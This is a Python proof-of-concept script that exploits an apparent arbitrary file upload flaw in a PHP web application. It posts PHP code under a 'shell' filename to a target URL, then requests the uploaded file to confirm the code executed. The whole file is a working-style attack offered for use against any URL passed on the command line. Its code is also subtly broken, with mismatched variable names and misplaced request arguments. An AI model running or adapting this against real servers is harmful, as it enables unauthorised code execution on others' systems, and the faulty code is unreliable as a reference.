# -*- coding:utf-8 -*-
import urllib.request
import urllib.parse
import urllib
import time
import string
import sys
import random

def poc(target):
    headers = {}
    filename = ("shell" + str(random.randrange(1000, 9999)) + ".php")
    post_data = "<?print(md5(0x22))?>"
    target_url = target + "?name=" + filename
    req = urllib.request.Request(target_url, headers)
    response = urllib.request.urlopen(req, data= b"<?print(md5(0x22))?>") 
    data = response.read()
    data = str(data, encoding = "utf-8")
    if data.find("tmp-upload-images") == -1: #回显字符串中没有tmp-upload-images，上传失败
        print("upload failed")
    else:
        print("upload shell success: likely - File Upload\n")
        flie_url = "http://**.**.**.**/dayrui/libraries/tmp-upload-images/" + fileName #读取上传后的文件路径
        response_2 = urllib.request.urlopen(flie_url)
        data_2 = response_2.read()
        data_2 = str(data_2, encoding = "utf-8")
        if data_2.find("e369853df766fa44e1ed0ff613f563bd") != -1: #输出上传文件路径 e369853df766fa44e1ed0ff613f563bd == md5(34)
            print("poc: " + file_url)

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        url = args[1]
        poc(url)
    else:
        print("Usage: python %s url" % (args[0]))
        
if __name__ == "__main__":
    main()
